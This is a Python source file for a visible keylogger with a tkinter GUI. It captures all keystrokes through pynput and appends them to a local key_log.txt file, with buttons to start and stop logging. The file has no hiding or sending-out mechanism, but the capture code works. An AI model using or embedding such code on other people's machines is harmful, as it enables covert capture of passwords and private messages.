import tkinter as tk
from tkinter import ttk
from pynput import keyboard
import threading
import datetime

class Keylogger:
    def __init__(self):
        self.log = ""
        self.is_listening = False
        self.listener = None

    def _on_press(self, key):
        try:
            self.log += key.char
        except AttributeError:
            self.log += f"[{key}]"

        with open("key_log.txt", "a") as f:
            f.write(self.log)
            self.log = ""

    def start(self):
        self.is_listening = True
        self.listener = keyboard.Listener(on_press=self._on_press)
        self.listener.start()

    def stop(self):
        if self.listener:
            self.listener.stop()
        self.is_listening = False


class KeyloggerGUI:
    def __init__(self, master):
        self.master = master
        self.master.title("Keylogger GUI")
        self.master.geometry("500x350")
        self.master.configure(bg="#1e1e2f")
        self.master.resizable(False, False)

        self.keylogger = Keylogger()

        self.style = ttk.Style()
        self.style.theme_use("clam")
        self.style.configure("TButton", font=("Segoe UI", 12), padding=10)
        self.style.configure("TLabel", font=("Segoe UI", 12), background="#1e1e2f", foreground="white")

        self.create_widgets()

    def create_widgets(self):
        self.title_label = ttk.Label(self.master, text="🛡️ Keylogger GUI", font=("Segoe UI", 16, "bold"))
        self.title_label.pack(pady=10)

        self.clock_label = ttk.Label(self.master, text="", font=("Segoe UI", 10))
        self.clock_label.pack()
        self.update_clock()

        self.start_btn = ttk.Button(self.master, text="Start Logging", command=self.start_logging)
        self.start_btn.pack(pady=10)

        self.stop_btn = ttk.Button(self.master, text="Stop Logging", command=self.stop_logging)
        self.stop_btn.pack(pady=5)

        self.status = ttk.Label(self.master, text="Status: Idle")
        self.status.pack(pady=20)

    def update_clock(self):
        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.clock_label.config(text=f"🕒 {now}")
        self.master.after(1000, self.update_clock)

    def start_logging(self):
        if not self.keylogger.is_listening:
            self.keylogger.start()
            self.status.config(text="Status: Logging...")

    def stop_logging(self):
        if self.keylogger.is_listening:
            self.keylogger.stop()
            self.status.config(text="Status: Stopped")


if __name__ == "__main__":
    root = tk.Tk()
    gui = KeyloggerGUI(root)
    root.mainloop()
